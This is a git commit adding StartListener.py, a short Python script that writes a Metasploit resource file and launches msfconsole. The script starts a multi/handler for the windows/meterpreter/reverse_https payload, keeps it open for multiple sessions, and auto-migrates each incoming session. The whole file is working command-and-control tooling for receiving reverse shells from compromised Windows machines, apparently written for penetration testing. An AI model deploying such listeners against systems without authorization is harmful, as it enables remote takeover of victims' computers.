028aec46755470a5f33879874bef2e6cf0d52ea7
Chris Campbell <obscuresec@gmail.com>
2013-07-17 00:21:14 -0400

    Create StartListener.py
    Simple python script to start a Meterpreter HTTPs Handler

---
+++ StartListener.py
@@ -0,0 +1,32 @@
+#!/usr/bin/python
+#
+# StartListener.py
+# Simple python script to start a Meterpreter HTTPs Handler
+# by Chris Campbell (obscuresec)
+#
+import sys
+import subprocess
+
+#write a resource file and call it
+def build(lhost,lport):
+  options = "use multi/handler\n"
+	options += "set payload windows/meterpreter/reverse_https\n"
+	options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
+	options += "set ExitOnSession false\n"
+	options += "set AutoRunScript post/windows/manage/smart_migrate\n"
+	options += "exploit -j\n"
+	filewrite = file("listener.rc", "w")
+	filewrite.write(options)
+	filewrite.close()
+	subprocess.Popen("/opt/metasploit/app/msfconsole -r listener.rc", shell=True).wait()
+
+#grab args
+try:    
+	lhost = sys.argv[1]
+	lport = sys.argv[2]
+	build(lhost,lport)
+
+#index error
+except IndexError:
+	print "python StartListener.py lhost lport"
+
